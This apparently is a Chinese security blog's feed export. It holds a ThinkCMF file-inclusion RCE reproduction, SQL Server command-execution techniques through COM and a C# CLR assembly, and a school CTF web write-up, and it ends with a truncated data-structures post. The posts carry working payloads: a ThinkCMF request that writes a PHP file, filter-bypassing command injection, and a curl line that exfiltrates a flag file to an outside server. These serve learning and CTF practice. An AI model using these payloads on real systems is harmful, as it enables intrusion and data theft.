src="https://s3.ax1x.com/2021/01/20/sRMQQH.png" alt=""></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;regsvr32为白名单，但是面对各种杀软和defender。早已被拦截，虽然可以命令行绕过，但是在看到某文章后决定复现一波&lt;br&gt;参考链接</summary>
      
    
    
    
    
    <category term="红队" scheme="http://422926799.github.io/tags/红队/"/>
    
  </entry>
  
  <entry>
    <title>ThinkCMF任意包含漏洞复现</title>
    <link href="http://422926799.github.io/posts/3656eb8c.html"/>
    <id>http://422926799.github.io/posts/3656eb8c.html</id>
    <published>2021-01-09T07:34:49.000Z</published>
    <updated>2021-01-09T07:42:16.658Z</updated>
    
    <content type="html"><![CDATA[<h2 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><p>根据ThinkPHP框架约定可以通过a参数来指定对应的函数名，但是该函数的修饰符必须为Public, 而添加的代码正好符合该条件。 可以通过如下URL进行访问，并且可以添加GET参数arg1传递给函数。</p><h2 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h2><p>远程攻击者在无需任何权限情况下，通过构造特定的请求包即可在远程服务器上执行任意代码。</p><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>ThinkCMF X1.6.0<br>ThinkCMF X2.1.0<br>ThinkCMF X2.2.0<br>ThinkCMF X2.2.1<br>ThinkCMF X2.2.2</p><h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><p>漏洞出在：application\Portal\Controller\IndexController.class.php<br>首先引用Common\Controller\HomebaseController控制类文件，然后调用display函数<br><img src="https://s3.ax1x.com/2021/01/09/sMq958.png" alt=""></p><p>跟入display函数看描述就是可以自定义加载模版，通过$this-&gt;parseTemplate 函数根据约定确定模版路径，如果不符合原先的约定将会从当前目录开始匹配。<br><img src="https://s3.ax1x.com/2021/01/09/sMqZbq.png" alt=""></p><pre><code class="php">public function parseTemplate($template=&#39;&#39;) {   $tmpl_path=C(&quot;SP_TMPL_PATH&quot;); // 前台模板文件根目录 themes/   define(&quot;SP_TMPL_PATH&quot;, $tmpl_path);   if($this-&gt;theme) { // 指定模板主题       $theme = $this-&gt;theme;   }else{       // 获取当前主题名称       $theme      =    C(&#39;SP_DEFAULT_THEME&#39;); // 前台模板文件 simplebootx       if(C(&#39;TMPL_DETECT_THEME&#39;)) {// 自动侦测模板主题           $t = C(&#39;VAR_TEMPLATE&#39;); //默认模板切换变量 t           if (isset($_GET[$t])){               $theme = $_GET[$t];           }elseif(cookie(&#39;think_template&#39;)){               $theme = cookie(&#39;think_template&#39;);           }           if(!file_exists($tmpl_path.&quot;/&quot;.$theme)){ //判断前台模板文件是否存在               $theme  =   C(&#39;SP_DEFAULT_THEME&#39;);           }           cookie(&#39;think_template&#39;,$theme,864000);       }   }   $theme_suffix=&quot;&quot;;   if(C(&#39;MOBILE_TPL_ENABLED&#39;) &amp;&amp; sp_is_mobile()){//开启手机模板支持       if (C(&#39;LANG_SWITCH_ON&#39;,null,false)){           if(file_exists($tmpl_path.&quot;/&quot;.$theme.&quot;_mobile_&quot;.LANG_SET)){//优先级最高               $theme_suffix  =  &quot;_mobile_&quot;.LANG_SET;           }elseif (file_exists($tmpl_path.&quot;/&quot;.$theme.&quot;_mobile&quot;)){               $theme_suffix  =  &quot;_mobile&quot;;           }elseif (file_exists($tmpl_path.&quot;/&quot;.$theme.&quot;_&quot;.LANG_SET)){               $theme_suffix  =  &quot;_&quot;.LANG_SET;           }       }else{              if(file_exists($tmpl_path.&quot;/&quot;.$theme.&quot;_mobile&quot;)){                  $theme_suffix  =  &quot;_mobile&quot;;              }       }   }else{       $lang_suffix=&quot;_&quot;.LANG_SET;       if (C(&#39;LANG_SWITCH_ON&#39;,null,false) &amp;&amp; file_exists($tmpl_path.&quot;/&quot;.$theme.$lang_suffix)){           $theme_suffix = $lang_suffix;       }   }   $theme=$theme.$theme_suffix; //定义当前语言   C(&#39;SP_DEFAULT_THEME&#39;,$theme);   $current_tmpl_path=$tmpl_path.$theme.&quot;/&quot;;   // 获取当前主题的模版路径   define(&#39;THEME_PATH&#39;, $current_tmpl_path);   $cdn_settings=sp_get_option(&#39;cdn_settings&#39;);   if(!empty($cdn_settings[&#39;cdn_static_root&#39;])){       $cdn_static_root=rtrim($cdn_settings[&#39;cdn_static_root&#39;],&#39;/&#39;);       C(&quot;TMPL_PARSE_STRING.__TMPL__&quot;,$cdn_static_root.&quot;/&quot;.$current_tmpl_path);       C(&quot;TMPL_PARSE_STRING.__PUBLIC__&quot;,$cdn_static_root.&quot;/public&quot;);       C(&quot;TMPL_PARSE_STRING.__WEB_ROOT__&quot;,$cdn_static_root);   }else{       C(&quot;TMPL_PARSE_STRING.__TMPL__&quot;,__ROOT__.&quot;/&quot;.$current_tmpl_path);   }   C(&#39;SP_VIEW_PATH&#39;,$tmpl_path);   C(&#39;DEFAULT_THEME&#39;,$theme);   define(&quot;SP_CURRENT_THEME&quot;, $theme);   if(is_file($template)) {      return $template;   }   $depr       =   C(&#39;TMPL_FILE_DEPR&#39;);   $template   =   str_replace(&#39;:&#39;, $depr, $template);   // 获取当前模块   $module   =  MODULE_NAME;   if(strpos($template,&#39;@&#39;)){ // 跨模块调用模版文件      list($module,$template)  =   explode(&#39;@&#39;,$template);   }   $module =$module.&quot;/&quot;;   // 分析模板文件规则   if(&#39;&#39; == $template) {      // 如果模板文件名为空 按照默认规则定位      $template = CONTROLLER_NAME . $depr . ACTION_NAME;   }elseif(false === strpos($template, &#39;/&#39;)){      $template = CONTROLLER_NAME . $depr . $template;   }   $file = sp_add_template_file_suffix($current_tmpl_path.$module.$template);   $file= str_replace(&quot;//&quot;,&#39;/&#39;,$file);   if(!file_exists_case($file)) E(L(&#39;_TEMPLATE_NOT_EXIST_&#39;).&#39;:&#39;.$file);   return $file;}</code></pre><p>由于parseTemplate函数为模板渲染函数，而该函数权限为public。导致可控，最终payload如下：<br>/?a=fetch&amp;templateFile=public/index&amp;prefix=’’&amp;content=<php>file_put_contents(‘test.php’,’&lt;?php phpinfo(); ?&gt;’)</php><br><img src="https://s3.ax1x.com/2021/01/09/sMqMPU.png" alt=""></p><p><img src="https://s3.ax1x.com/2021/01/09/sMq8M9.png" alt=""></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.cnblogs.com/ch459742906/p/5949168.html" target="_blank" rel="noopener">https://www.cnblogs.com/ch459742906/p/5949168.html</a><br><a href="https://mp.weixin.qq.com/s/3d7YrTq0vFSKXV6u0Hjnnw" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/3d7YrTq0vFSKXV6u0Hjnnw</a><br><a href="https://www.cnblogs.com/0daybug/p/11720575.html" target="_blank" rel="noopener">https://www.cnblogs.com/0daybug/p/11720575.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;漏洞成因&quot;&gt;&lt;a href=&quot;#漏洞成因&quot; class=&quot;headerlink&quot; title=&quot;漏洞成因&quot;&gt;&lt;/a&gt;漏洞成因&lt;/h2&gt;&lt;p&gt;根据ThinkPHP框架约定可以通过a参数来指定对应的函数名，但是该函数的修饰符必须为Public, 而添加的代码正好符合该</summary>
      
    
    
    
    
    <category term="代码审计" scheme="http://422926799.github.io/tags/代码审计/"/>
    
  </entry>
  
  <entry>
    <title>sql server没xp_cmdshell执行命令</title>
    <link href="http://422926799.github.io/posts/639a5410.html"/>
    <id>http://422926799.github.io/posts/639a5410.html</id>
    <published>2021-01-07T00:32:40.000Z</published>
    <updated>2021-01-07T00:43:01.518Z</updated>
    
    <content type="html"><![CDATA[<h2 id="利用COM执行命令"><a href="#利用COM执行命令" class="headerlink" title="利用COM执行命令"></a>利用COM执行命令</h2><p>（需要开启Ole Automation Procedures组件）</p><pre><code>declare @luan int,@exec int,@text int,@str varchar(8000);exec sp_oacreate &#39;{72C24DD5-D70A-438B-8A42-98424B88AFB8}&#39;,@luan output;exec sp_oamethod @luan,&#39;exec&#39;,@exec output,&#39;C:\\Windows\\System32\\cmd.exe /c whoami&#39;;exec sp_oamethod @exec, &#39;StdOut&#39;, @text out;exec sp_oamethod @text, &#39;readall&#39;, @str out;select @str;</code></pre><p><img src="https://s3.ax1x.com/2021/01/07/sZs3hd.png" alt=""></p><p>没有开启Ole Automation Procedures，可以用下面的命令开启</p><pre><code>sp_configure &#39;show advanced options&#39;, 1;GORECONFIGURE;GOsp_configure &#39;Ole Automation Procedures&#39;, 1;GORECONFIGURE;GO</code></pre><h2 id="编写CLR实现执行命令"><a href="#编写CLR实现执行命令" class="headerlink" title="编写CLR实现执行命令"></a>编写CLR实现执行命令</h2><p>编写语言：C#<br>Vs创建类库</p><pre><code class="C#">using System;using System.Collections.Generic;using System.Linq;using System.Text;using System;using System.Threading.Tasks;namespace shellexec{    public class exec    {        public static string cmd(string command)        {            System.Diagnostics.Process pro = new System.Diagnostics.Process();            pro.StartInfo.FileName = &quot;cmd.exe&quot;;            pro.StartInfo.UseShellExecute = false;            pro.StartInfo.RedirectStandardError = true; //标准错误            pro.StartInfo.RedirectStandardInput = true; //标准输入            pro.StartInfo.RedirectStandardOutput = true; //标准输出            pro.StartInfo.CreateNoWindow = true; //是否在新窗口开启进程            pro.Start();            pro.StandardInput.WriteLine(command + &quot;&amp;&amp;exit&quot;); //命令参数写入            pro.StandardInput.AutoFlush = true; //缓冲区自动刷新            string output = pro.StandardOutput.ReadToEnd(); //读取执行结果            pro.WaitForExit(); //等待执行完成退出            pro.Close();            return output.ToString();        }    }}</code></pre><p>生成dll后，可以用hex的方法写到目标，或者shell上传。然后开始构造<br>1.目标数据库实例需要启用clr集成</p><pre><code>exec sp_configure &#39;clr enabled&#39;, 1;--在SQL Server中启用CLRreconfigure;go</code></pre><p>2.目标数据库的可信任属性需要设为false,可以使用以下语句启用</p><pre><code>ALTER DATABASE [&lt;数据库名称&gt;] SET TRUSTWORTHY ON</code></pre><p>3.在数据库中注册DLL</p><pre><code>CREATE ASSEMBLY MySqlCLR FROM &#39;&lt;dll的路径&gt;&#39; //MySqlCLR为导入dll后的变量名称</code></pre><p>4.创建函数<br>（根据对应函数的类型的参数构造对应的参数类型，然后RETURNS [nvarchar] (max)记得设置为返回最大如果是返回string类型的话），在直接这个dll的名称在那个命名空间、类、函数）</p><pre><code>CREATE FUNCTION [dbo].[cmd2]  (      @cmd AS NVARCHAR(max))  RETURNS [nvarchar] (max) WITH EXECUTE AS CALLERAS  EXTERNAL NAME [MySqlCLR].[shellexec.exec].cmd //shellexec为命名空间，exec为类名，cmd为函数名GO</code></pre><p>5.程序集的权限级别必须设为 external access,否则在部署的时候会报错</p><pre><code>ALTER ASSEMBLY [MySqlCLR]WITH PERMISSION_SET = UNSAFE</code></pre><p>6.调用存储过程和函数方法</p><pre><code>select [dbo].[cmd2](&#39;whoami&#39;)</code></pre><p><img src="https://s3.ax1x.com/2021/01/07/sZs6cq.png" alt=""></p><p><img src="https://s3.ax1x.com/2021/01/07/sZsWHU.png" alt=""></p><p>参考链接：<br><a href="https://blog.csdn.net/catchme_439/article/details/78411009" target="_blank" rel="noopener">https://blog.csdn.net/catchme_439/article/details/78411009</a><br><a href="https://zhuanlan.zhihu.com/p/33322584?from_voters_page=true" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/33322584?from_voters_page=true</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;利用COM执行命令&quot;&gt;&lt;a href=&quot;#利用COM执行命令&quot; class=&quot;headerlink&quot; title=&quot;利用COM执行命令&quot;&gt;&lt;/a&gt;利用COM执行命令&lt;/h2&gt;&lt;p&gt;（需要开启Ole Automation Procedures组件）&lt;/p&gt;
&lt;pre</summary>
      
    
    
    
    
    <category term="Writing" scheme="http://422926799.github.io/tags/Writing/"/>
    
  </entry>
  
  <entry>
    <title>学校ctf部分wp</title>
    <link href="http://422926799.github.io/posts/81eaad2f.html"/>
    <id>http://422926799.github.io/posts/81eaad2f.html</id>
    <published>2021-01-04T05:22:17.000Z</published>
    <updated>2021-01-04T06:41:10.360Z</updated>
    
    <content type="html"><![CDATA[<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=1390440146&auto=1&height=66"></iframe><p><strong>主要是web题的wp</strong></p><h2 id="flag给你"><a href="#flag给你" class="headerlink" title="flag给你"></a>flag给你</h2><p><img src="https://s3.ax1x.com/2021/01/04/sPMH1S.png" alt=""></p><p>访问链接得到flag，给出的flag少了一个-。加上去即可<br><img src="https://s3.ax1x.com/2021/01/04/sPMX0s.png" alt=""></p><pre><code>flag{091efg59-258e-3abv-c3h7-f18769f21b59}</code></pre><h2 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h2><p>给出一段code</p><pre><code class="php">&lt;?phperror_reporting(0);include &quot;flag.php&quot;;$key = &quot;abcdefg!!!&quot;;$str = $_GET[&#39;str&#39;];if (unserialize($str) === &quot;$key&quot;){    echo $flag;}show_source(__FILE__);?&gt;</code></pre><p>序列化code如下</p><pre><code class="php">&lt;?phperror_reporting(0);//include &quot;flag.php&quot;;$key = &quot;abcdefg!!!&quot;;$str = &quot;abcdefg!!!&quot;;echo serialize($str);?&gt;</code></pre><p><img src="https://s3.ax1x.com/2021/01/04/sPlk28.png" alt=""></p><h2 id="你猜"><a href="#你猜" class="headerlink" title="你猜"></a>你猜</h2><p>Ctrl+U得到注释的code<br><img src="https://s3.ax1x.com/2021/01/04/sPlVKg.png" alt=""></p><pre><code class="php">&lt;?phpsession_start();$_SESSION[&#39;pwd&#39;]=time();if (isset ($_POST[&#39;password&#39;])) {    if ($_POST[&#39;pwd&#39;] == $_SESSION[&#39;pwd&#39;])        die(&#39;Flag:&#39;.$flag);    else{        print &#39;&lt;p&gt;猜测错误.&lt;/p&gt;&#39;;        $_SESSION[&#39;pwd&#39;]=time().time();    }}?&gt;</code></pre><p>session ID是我们可控的，pwd也是我们可控的，唯一就是session我们无法控制是多少，但是可以置为空<br>删除PHPSESSID即可<br><img src="https://s3.ax1x.com/2021/01/04/sP1tl8.png" alt=""></p><h2 id="flag在那里"><a href="#flag在那里" class="headerlink" title="flag在那里"></a>flag在那里</h2><p>打开一个lnk，点开跳转到404<br><img src="https://s3.ax1x.com/2021/01/04/sP12XF.png" alt=""></p><p>抓包发现把flag base64编码放在了请求头<br><img src="https://s3.ax1x.com/2021/01/04/sP15kR.png" alt=""></p><pre><code>ctf{f31a81e91afdcf0b84dfee82ec2fb196}</code></pre><h2 id="不想和你说话"><a href="#不想和你说话" class="headerlink" title="不想和你说话"></a>不想和你说话</h2><p><img src="https://s3.ax1x.com/2021/01/04/sP17p6.png" alt=""></p><p>典型的变量覆盖，把b覆盖为空。a参数为空，非===达到若判断，””==False<br><img src="https://s3.ax1x.com/2021/01/04/sP3YNR.png" alt=""></p><h2 id="该网站已被黑"><a href="#该网站已被黑" class="headerlink" title="该网站已被黑"></a>该网站已被黑</h2><p>没什么好说的，访问shell.php。密码为hack，得到flag<br><img src="https://s3.ax1x.com/2021/01/04/sP34KS.png" alt=""></p><h2 id="lottery"><a href="#lottery" class="headerlink" title="lottery"></a>lottery</h2><p><img src="https://s3.ax1x.com/2021/01/04/sP3H5n.png" alt=""></p><p>查看js，访问data.php。然后解析json显示<br><img src="https://s3.ax1x.com/2021/01/04/sP3XvT.png" alt=""></p><p>拿原题的脚本跑即可得到flag</p><pre><code class="python">import asyncioimport timeimport aiohttpimport jsoncalc=0class test(object):    async def crackpassword(self,number):        global calc        if calc &gt; 0:            print(calc)            exit()        async with number:            async with aiohttp.ClientSession(headers={&quot;User-Agent&quot;:&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36&quot;}) as session:                async with session.get(url=&quot;http://10.20.105.228:8811/data.php&quot;) as response:                    jsons=json.loads(await response.text())                    if jsons[&#39;angle&#39;]&gt;=150 and jsons[&#39;angle&#39;]&lt;=210:                        print(jsons[&#39;flag&#39;])                        calc+=1    async def run(self):        number=asyncio.Semaphore(500)        data=[self.crackpassword(number) for k in range(500)]        await asyncio.wait(data)if __name__ == &#39;__main__&#39;:    obj=test()    loop=asyncio.get_event_loop()    loop.run_until_complete(obj.run())    loop.close()</code></pre><p><img src="https://s3.ax1x.com/2021/01/04/sP8oQK.png" alt=""></p><h2 id="easygame"><a href="#easygame" class="headerlink" title="easygame"></a>easygame</h2><p><img src="https://s3.ax1x.com/2021/01/04/sPGuOU.png" alt=""></p><p>根据GET请求得到下一个请求<br><img src="https://s3.ax1x.com/2021/01/04/sPGN6K.png" alt=""></p><p>请求告知不是admin<br><img src="https://s3.ax1x.com/2021/01/04/sPG0TH.png" alt=""></p><p>带上X-Forwarded-For头设为127.0.0.1即可得到flag<br><img src="https://s3.ax1x.com/2021/01/04/sPGrtA.png" alt=""></p><h2 id="url"><a href="#url" class="headerlink" title="url"></a>url</h2><p>打开url，点击lnk下载flag.txt告知flag不在此。注释看到flag.php<br><img src="https://s3.ax1x.com/2021/01/04/sPGf0g.png" alt=""></p><p>下载flag.php得到code</p><pre><code class="php">&lt;?phpheader(&#39;Content-Type: text/html; charset=utf-8&#39;); //网页编码function encrypt($data, $key) {    $key = md5 ( $key );    $x = 0;    $len = strlen ( $data );    $l = strlen ( $key );    for($i = 0; $i &lt; $len; $i ++) {        if ($x == $l) {            $x = 0;        }        $char .= $key {$x};        $x ++;    }    for($i = 0; $i &lt; $len; $i ++) {        $str .= chr ( ord ( $data {$i} ) + (ord ( $char {$i} )) % 256 );    }    return base64_encode ( $str );}function decrypt($data, $key) {    $key = md5 ( $key );    $x = 0;    $data = base64_decode ( $data );    $len = strlen ( $data );    $l = strlen ( $key );    for($i = 0; $i &lt; $len; $i ++) {        if ($x == $l) {            $x = 0;        }        $char .= substr ( $key, $x, 1 );        $x ++;    }    for($i = 0; $i &lt; $len; $i ++) {        if (ord ( substr ( $data, $i, 1 ) ) &lt; ord ( substr ( $char, $i, 1 ) )) {            $str .= chr ( (ord ( substr ( $data, $i, 1 ) ) + 256) - ord ( substr ( $char, $i, 1 ) ) );        } else {            $str .= chr ( ord ( substr ( $data, $i, 1 ) ) - ord ( substr ( $char, $i, 1 ) ) );        }    }    return $str;}$key=&quot;ctf&quot;;$flag=&quot;xWqammfJaWrGm5yayJttaGiTlJRsbGrMmWxqa2fMm50=&quot;;//encrypt($flag,$key)?&gt;</code></pre><p>调用decrypt函数解码得到flag<br><img src="https://s3.ax1x.com/2021/01/04/sPJWgx.png" alt=""></p><pre><code>ctf{d2686e18b9ebc793613d448f73563f8d}</code></pre><h2 id="你算的太慢"><a href="#你算的太慢" class="headerlink" title="你算的太慢"></a>你算的太慢</h2><p><img src="https://s3.ax1x.com/2021/01/04/sPYGM6.png" alt=""></p><p>实验吧原题，直接拿py带session计算重发即可得到flag</p><h2 id="sha"><a href="#sha" class="headerlink" title="sha"></a>sha</h2><p>view得到code</p><pre><code class="php">if (isset($_GET[&#39;name&#39;]) and isset($_GET[&#39;password&#39;])) {    if ($_GET[&#39;name&#39;] == $_GET[&#39;password&#39;])        echo &#39;&lt;p&gt;Your password can not be your name!&lt;/p&gt;&#39;;    else if (sha1($_GET[&#39;name&#39;]) === sha1($_GET[&#39;password&#39;]))      die(&#39;Flag: &#39;.$flag);    else        echo &#39;&lt;p&gt;Invalid password.&lt;/p&gt;&#39;;}else{    echo &#39;&lt;p&gt;Login first!&lt;/p&gt;&#39;;</code></pre><p>数组请求绕过判断，然后不使得判断成立得到flag</p><pre><code>http://10.20.105.228:8812/?name[]=&amp;password[]=admin</code></pre><p><img src="https://s3.ax1x.com/2021/01/04/sPYzS1.png" alt=""></p><h2 id="md5"><a href="#md5" class="headerlink" title="md5"></a>md5</h2><p>找不到切入点，跳过</p><h2 id="ping"><a href="#ping" class="headerlink" title="ping"></a>ping</h2><p>RCE空格绕过</p><pre><code class="php">&lt;?phpif(isset($_REQUEST[ &#39;ip&#39; ])) {    $target = trim($_REQUEST[ &#39;ip&#39; ]);    $substitutions = array(        &#39;head&#39; =&gt; &#39;&#39;,        &#39;ls&#39; =&gt; &#39;&#39;,        &#39;cat&#39; =&gt; &#39;&#39;,        &#39;flag&#39; =&gt; &#39;&#39;,        &#39;&lt;&#39;  =&gt; &#39;&#39;,        &#39; &#39;  =&gt; &#39;&#39;,        &#39;&amp;&#39;  =&gt; &#39;&#39;,        &#39;|&#39; =&gt; &#39;&#39;,        &#39;-&#39;  =&gt; &#39;&#39;,        &#39;(&#39;  =&gt; &#39;&#39;,        &#39;)&#39;  =&gt; &#39;&#39;,        &#39;`&#39;  =&gt; &#39;&#39;,        &#39;||&#39; =&gt; &#39;&#39;,    );    $target = str_replace( array_keys( $substitutions ), $substitutions, $target );    $cmd = shell_exec( &#39;ping  -c 1 &#39; . $target );        echo $target;    echo  &quot;&lt;pre&gt;{$cmd}&lt;/pre&gt;&quot;;}show_source(__FILE__);?&gt;</code></pre><p>变量拼接绕过</p><pre><code>http://10.20.105.228:8815/?ip=127.0.0.1;a=c;b=at;$a$b${IFS}*</code></pre><p><img src="https://s3.ax1x.com/2021/01/04/sPtWnK.png" alt=""></p><h2 id="不难的"><a href="#不难的" class="headerlink" title="不难的"></a>不难的</h2><pre><code class="php">&lt;?php  include(&#39;hint.php&#39;);$data = $_GET[&quot;data&quot;];if(isset($data)&amp;&amp;(file_get_contents($data,&#39;r&#39;)===&quot;Welcome to jmpt CTF&quot;)){    echo $hint;}if(isset($_GET[&#39;file&#39;])){      $file = $_GET[&#39;file&#39;];      $content = $_POST[&#39;content&#39;];      $file = str_replace(&quot;php&quot;, &quot;???&quot;, $file);      $file = str_replace(&quot;data&quot;, &quot;???&quot;, $file);      $file = str_replace(&quot;:&quot;, &quot;???&quot;, $file);      $file = str_replace(&quot;.&quot;, &quot;???&quot;, $file);      file_put_contents(urldecode($file), &quot;&lt;?php die(&#39;a，各位师傅太能秀了！&#39;);?&gt;&quot;.$content);  }else{      highlight_file(__FILE__);  }?&gt;</code></pre><p>死亡exit绕过，p神有细说。<br>url双重编码绕过文件名过滤<br>rot13绕过即可（开启了短标签，rot13不会被解码写入，直接不编码即可）<br><img src="https://s3.ax1x.com/2021/01/04/sPN8HO.png" alt=""></p><p><img src="https://s3.ax1x.com/2021/01/04/sPNdgI.png" alt=""></p><h2 id="qiongqiong"><a href="#qiongqiong" class="headerlink" title="qiongqiong"></a>qiongqiong</h2><pre><code class="php">&lt;?phpshow_source(__FILE__);if(isset($_GET[&#39;a&#39;])){    $feiyu=$_GET[&#39;a&#39;];    highlight_file(__FILE__);        if(preg_match(&quot;/[A-Za-oq-z0-9$]+/&quot;,$feiyu)){            die(&quot;No1 Die&quot;);        }        if(preg_match(&quot;/\~|\!|\@|#\|\%|\^|\&amp;|\*|\(|\)|\（|\）|\-|\_|\{|\}|\[|\]|\&#39;|\&quot;|\:|\,/&quot;,$feiyu)){            die(&quot;No2 Die&quot;);        }        eval($feiyu);}?&gt;</code></pre><p>wfuzz得到没被过滤的几个字符<br><img src="https://s3.ax1x.com/2021/01/04/sPNvKx.png" alt=""></p><p>搜索得到该题为php临时文件shell<br><img src="https://s3.ax1x.com/2021/01/04/sPUCIe.png" alt=""></p><h2 id="满意的数字"><a href="#满意的数字" class="headerlink" title="满意的数字"></a>满意的数字</h2><p>访问index.php.txt得到code</p><pre><code class="php">&lt;?phpheader ( &#39;Content-Type: text/html; charset=utf-8&#39; ); // 网页编码error_reporting ( 0 );$flag = &quot;*******************&quot;;//echo $_POST[&#39;num&#39;];if (isset ( $_POST [&#39;num&#39;] )) {    if (@ereg ( &quot;^[1-9]+$&quot;, $_POST[&#39;num&#39;] ) === FALSE)        echo &#39;说好的数字呢？&#39;;    else if (strpos ( $_POST[&#39;num&#39;], &#39;#testaasafd&#39; ) !== FALSE)        die ( &#39;Flag: &#39; . $flag );    else        echo &#39;你的数字不太符合我的心意哦！&#39;;}?&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;猜密码&lt;/title&gt;&lt;/head&gt;&lt;body style=&quot;text-align: center&quot;&gt;&lt;center&gt;&lt;img src=&quot;num.png&quot;/&gt;    &lt;form action=&quot;index.php&quot; method=&quot;post&quot;&gt;        &lt;input type=&quot;text&quot; name=&quot;num&quot; /&gt; &lt;input type=&quot;submit&quot; value=&quot;提交&quot; /&gt;    &lt;/form&gt;&lt;/center&gt;    &lt;!-- index.php.txt  --&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>数组绕过解决<br><img src="https://s3.ax1x.com/2021/01/04/sPU3zn.png" alt=""></p><h2 id="babyphp"><a href="#babyphp" class="headerlink" title="babyphp"></a>babyphp</h2><pre><code class="php">&lt;?phphighlight_file(&#39;source.txt&#39;);echo &quot;&lt;br&gt;&lt;br&gt;&quot;;$flag = &#39;xxxxxxxx&#39;;$msg_giveme = &#39;Give me the flag!&#39;;$msg_getout = &#39;No this. Get out!&#39;;if(!isset($_GET[&#39;flag&#39;]) &amp;&amp; !isset($_POST[&#39;flag&#39;])){    exit($msg_giveme);}if($_POST[&#39;flag&#39;] === &#39;flag&#39; || $_GET[&#39;flag&#39;] === &#39;flag&#39;){    exit($msg_getout);}foreach ($_POST as $key =&gt; $value) {    $$key = $value;}foreach ($_GET as $key =&gt; $value) {    $$key = $$value;}echo &#39;the flag is : &#39; . $flag;?&gt;</code></pre><p>变量覆盖，原本是要flag=flag才能得到真正的flag，但是被if过滤了，多个变量暂存即可绕过</p><pre><code>http://10.20.105.228:8809/?123=flag&amp;flag=123</code></pre><p><img src="https://s3.ax1x.com/2021/01/04/sPUoQI.png" alt=""></p><h2 id="Simple"><a href="#Simple" class="headerlink" title="Simple"></a>Simple</h2><pre><code class="php">&lt;?phperror_reporting(0);highlight_file(__FILE__);//flag.phpif($c = @$_GET[&#39;c&#39;]){    if(!preg_match(&#39;/system|nc|wget|exec|passthru|netcat/i&#39;, $c)){        eval(substr($c,0,5));    }else{        die(&quot;5个字母够了呀!&quot;);    }}</code></pre><p>搜索得知``为shell_exec缩写<br>此时将如上payload传到eval将变成如下<br><code>eval(</code>$c<code>;&lt;command&gt;)</code></p><p>看了一下wp，什么bp自带的客户端的dnslog数据外带，尝试用ceye.io数据外带。不是请求不到就是数据返回不全<br>最后想到的解决方法是，在服务器上<br><code>python3 -m http.server 4444</code></p><p>然后payload为<br><code>http://81.70.105.149:8006/?c=\</code>$c`;curl%20http://<ip>:4444/<code>cat${IFS}flag_i5_fun.php|grep${IFS}flag|base64</code><br><img src="https://s3.ax1x.com/2021/01/04/sPaAkF.png" alt=""></ip></p>]]></content>
    
    
      
      
    <summary type="html">&lt;iframe frameborder=&quot;no&quot; border=&quot;0&quot; marginwidth=&quot;0&quot; marginheight=&quot;0&quot; width=&quot;330&quot; height=&quot;86&quot; src=&quot;//music.163.com/outchain/player?type=2&amp;id=</summary>
      
    
    
    
    
    <category term="ctf" scheme="http://422926799.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>数据结构实现数组</title>
    <link href="http://422926799.github.io/posts/57421f1d.html"/>
    <id>http://422926799.github.io/posts/57421f1d.html</id>
    <published>2020-12-29T09:50:25.000Z</published>
    <updated>2020-12-29T09:58:22.688Z</updated>
    
    <content type="html"><![CDATA[<p>昨天在交流的时候发现数据结构还是有必要看一下，注意:是数据结构和算法的数据结构。不是基础的数据结构<br>目前需要学习的数据结构有：</p><pre><code>* 抽象数据类型 ADT，面向对象编程* 数组和列表* 链表，高级链表。双链表，循环双端链表* 队列，双端队列，循环双端队列* 栈，栈溢出* 算法分析，时间复杂度 大O 表示法* 哈希表，散列冲突* 字典* 集合* 递归* 查找：线性查找和二分查找* 基本排序算法* 高级排序算法: 归并排序、堆排序、快排* 树，二叉树* 图，dfs 和 bfs* python 内置常用数据结构和算法的使用。list, dict, set, collections 模块，heapq 模块* 面试笔试常考算法</code></pre><h2 id="数据和列表的区别"><a href="#数据和列表的区别" class="headerlink" title="数据和列表的区别"></a>数据和列表的区别</h2><p>数组：<br>数组是一个容器，它可以容纳一定数量的项目，这些项目是相同的类型。 大部分数据结构都使用数组来实现它们的算法。 以下是理解数组(Array)概念的重要术语。<br>元素 - 存储在数组中的每个项目称为元素。索引 - 数组中元素的每个位置都有一个数字索引，用于标识元素。//原文出自【易百教程】，商业转载请联系作者获得授权，非商业请保留原文链接：<a href="https://www.yiibai.com/python/py_data_structure/python_arrays.html" target="_blank" rel="noopener">https://www.yiibai.com/python/py_data_structure/python_arrays.html</a></p><p>列表：<br>列表是Python中最通用的数据类型，可以写成方括号之间的逗号分隔值(项目)列表。 使用列表的重要事项是，列表中的项目不必是相同的类型。也就是说一个列表中的项目(元素)可以是数字，字符串，数组，字典等甚至是列表类型。</p><p>数组和列表的区别为：数组只能放一个类型的数据，列表能放不同类型的数据</p><h2 id="使用python实现数组"><a href="#使用python实现数组" class="headerlink" title="使用python实现数组"></a>使用python实现数组</h2><p>虽然自带的Array的模块能实现数组，但是还是跟着文章走了一手<br>参考链接:<a href="https://blog.csdn.net/Tonywu2018/article/details/88819424" target="_blank" rel="noopener">https://blog.csdn.net/Tonywu2018/article/details/88819424</a></p><pre><code class="python">class Array(object):    def __init__(self,capacity,fillvalue=None):        self.items=list()        for count in range(capacity):            self.items.append(fillvalue)    def editarray(self,index):        if index+1&gt;int(len(self.items)):            #当当前索引下位标识超过数组长度自动添加数组长度            temp=Array(index+1)            